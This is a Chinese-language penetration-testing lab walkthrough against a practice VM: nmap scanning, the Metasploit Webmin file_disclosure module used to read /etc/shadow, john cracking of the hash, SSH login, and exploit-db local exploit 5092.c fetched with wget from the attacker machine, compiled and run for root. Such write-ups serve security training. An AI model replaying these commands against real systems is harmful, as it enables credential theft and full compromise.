
# 环境
攻击机IP：192.168.1.10<br />目标机IP：192.168.1.18


# 实战

## 信息收集
使用NMAP扫描端口
```
nmap -Pn -sV 192.168.1.18
```
![image.png](_img\06-靶场实践/1657691710906-922dad79-f263-457f-a284-8f9ab9f3ab22.png)

可以看到开放了22-SSH、80-http、10000-http等端口

先看看80端口，浏览一番后发现并没有什么东西，基本上就是有关提示
![image.png](_img\06-靶场实践/1657691713945-ff4c4840-e0e1-469e-aaa2-d86bacfaeed6.png)

看一下10000端口，是一个登录界面，尝试了一下万能密码，无法绕过
![image.png](_img\06-靶场实践/1657691719098-12b345ab-10af-46a8-ab13-e49ec46c53d3.png)


## 漏洞发现
在上面的扫描中我们发现1000端口运行的是`Webmin`程序，看看该程序有没有什么已知漏洞
```
searchsploit Webmin 0.01
```
![image.png](_img\06-靶场实践/1657691723087-f7d5d30b-fbcc-4fbf-98d7-5699ce30b877.png)


## 漏洞利用
存在漏洞那么我们就尝试利用漏洞得到一些信息，打开MSF查找`webmin`
![image.png](_img\06-靶场实践/1657691729000-e31e2669-56a3-4601-b9cd-6009b753d180.png)

看到`auxiliary/admin/webmin/file_disclosure`模块与我们在上面所找出来的漏洞相似，加以利用
```
msf6 > use 1             --利用模块
msf6 auxiliary(admin/webmin/file_disclosure) > show options         --查看需要的设置
msf6 auxiliary(admin/webmin/file_disclosure) > set rhosts 192.168.1.18    --设置目标IP
msf6 auxiliary(admin/webmin/file_disclosure) > run              --启动模块
```
![image.png](_img\06-靶场实践/1657691734720-1631fa6d-fd53-4df2-b8a7-57042b14ecd7.png)

可以看到我们获取了目标系统的可用用户名，然后去获取密码
```
msf6 auxiliary(admin/webmin/file_disclosure) > set rpath /etc/shadow
msf6 auxiliary(admin/webmin/file_disclosure) > run
```
![image.png](_img\06-靶场实践/1657691740316-6063fae7-6af9-4260-963b-204246a3a3fc.png)

将得到的密码HASH复制到一个文档中并命名为pass，使用john破解，得到密码h4ckm3
```
john --wordlist=/usr/share/wordlists/rockyou.txt pass
```
![image.png](_img\06-靶场实践/1657691744723-73167d98-1e3e-4bd7-9034-2258c5d26883.png)

在前面的扫描中我们看到开放了22-SSH端口，尝试连接
```
ssh vmware@192.168.1.18
```
![image.png](_img\06-靶场实践/1657691748882-43511379-c1a6-488a-ad13-ef973a44c39d.png)


## 提权
根据目标机器系统版本在kali中找到对应利用文件
![image.png](_img\06-靶场实践/1657691753134-f547b25b-6702-4889-b623-310020d920e0.png)

将利用文件复制到`/var/www/html`下
```
root@kali-xmtx:~/桌面# cd /usr/share/exploitdb/exploits/linux/local/
root@kali-xmtx:/usr/share/exploitdb/exploits/linux/local# cp 5092.c /var/www/html/
root@kali-xmtx:/usr/share/exploitdb/exploits/linux/local# cd /var/www/html/
root@kali-xmtx:/var/www/html# ls
```
![image.png](_img\06-靶场实践/1657691758954-6ced02c4-70d8-461f-b98c-6a9dd5bc54ac.png)

启动apach服务
```
service apache2 start
```

在ssh中将5092.c下载到目标机
```
vmware@ubuntuvm:/$ cd /tmp
vmware@ubuntuvm:/tmp$ wget http://192.168.1.10/5092.c
vmware@ubuntuvm:/tmp$ ls
```
![image.png](_img\06-靶场实践/1657691763383-7293846d-4f44-447c-9585-2cf656eaf297.png)

编译5092.c并赋权限然后执行
```
vmware@ubuntuvm:/tmp$ gcc 5092.c -o shell
vmware@ubuntuvm:/tmp$ chmod 777 shell
vmware@ubuntuvm:/tmp$ ./shell
```
![image.png](_img\06-靶场实践/1657691768418-21869f78-fee3-4183-924e-4724d3a9ea7a.png)

成功得到root权限
![image.png](_img\06-靶场实践/1657691772850-3e7d57dd-120e-447b-9c46-a6935ccc7591.png)
